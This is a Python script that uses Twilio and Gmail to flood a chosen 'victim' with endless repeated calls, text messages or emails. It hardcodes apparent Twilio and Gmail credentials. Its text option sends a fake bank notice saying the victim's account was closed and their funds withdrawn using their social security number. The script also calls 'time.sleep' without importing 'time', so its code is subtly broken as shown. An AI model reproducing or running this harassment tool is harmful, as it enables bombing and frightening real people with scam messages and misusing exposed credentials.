from twilio.rest import Client
import smtplib, ssl
import os

os.system("clear")

sid = 'AC7a570a1242d22a81208e5df19a973ac0' #Fill in with your Twilio SID
token = 'e7b9d0ae5daa66294895660c8ce23b93'  #Fill in with your Twilio Token

# yourEmail = "wagvbbc@gmail.com"
# yourPassword = "psK0Ny3in"

client = Client(sid, token)

number = "2565872695"  #Put your Twilio number here

def call(victimNumber, yourNumber):
	try:
		call = client.calls.create(
			to = victimNumber,
			from_ = yourNumber,
			twiml='<Response><Play>http://demo.twilio.com/docs/classic.mp3</Play></Response>',
			method = "GET",
		)
		print(" Started call to %s from %s" % (victimNumber, yourNumber));
	except Exception as err:
		print(" Error on %s from %s: %s" % (victimNumber, yourNumber, err));

def text(victimNumber, yourNumber):
	try:
		message = client.messages \
			.create(
				body=' Your bank account has been successfully closed. The social security number you used to open the account has been used to withdraw the remainder of the funds and close the account. Thank you for banking with us!',
				from_ = yourNumber,
				to = victimNumber
			)
		print(" Texted %s from %s" % (victimNumber, yourNumber));
	except Exception as err:
		print(" Error on %s from %s: %s" % (victimNumber, yourNumber, err));


times = 0
choice = input("\033[93m Call, Text or Email?: ").lower()

if choice == "call":
	victim = input("\033[94m To number?: ")
	while True:
		times += 1
		print("\033[92m Starting flood on %s,  %s times!" % (victim, times))
		call(victim, number)
		time.sleep(15)

elif choice == "text":
	victim = input("\033[94m To number?: ")
	while True:
		times +=1
		print("\033[92m Starting flood on %s, %s times!" % (victim, times))
		text(victim, number)
		time.sleep(15)

elif choice == "email":
	yourEmail = "wagcbbcj@gmail.com"
	yourPassword = "rb$SVDWdnhpiBsfsC2%@"

	theirEmail = input("\033[94m Victims email? ")
	msg = input("\033[94m Message? ")

	while True:
		times +=1
		print("\033[92m Starting flood on %s %s times!" % (theirEmail, times))
		
		s = smtplib.SMTP('smtp.gmail.com:587')
		s.ehlo()
		s.starttls()
		s.login(yourEmail, yourPassword)
		s.sendmail(yourEmail, theirEmail, msg)
		s.quit()
		time.sleep(60)

